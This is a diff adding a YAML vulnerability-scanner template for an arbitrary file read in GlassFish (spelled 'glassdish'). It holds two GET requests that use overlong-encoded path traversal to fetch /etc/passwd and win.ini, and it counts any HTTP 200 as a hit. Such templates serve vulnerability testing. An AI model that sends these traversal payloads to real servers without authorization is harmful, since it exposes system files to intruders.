@@ -1,0 +1,23 @@
+id: glassdish-arbitrary-file-read
+
+info:
+  name: glassdish任意文件读取
+  author: Master先生
+  severity: high
+  reference:
+    - https://www.freebuf.com/vuls/283806.html
+  tags: glassdish,file-read
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+      - "{{BaseURL}}/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
+
+    redirects: false
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
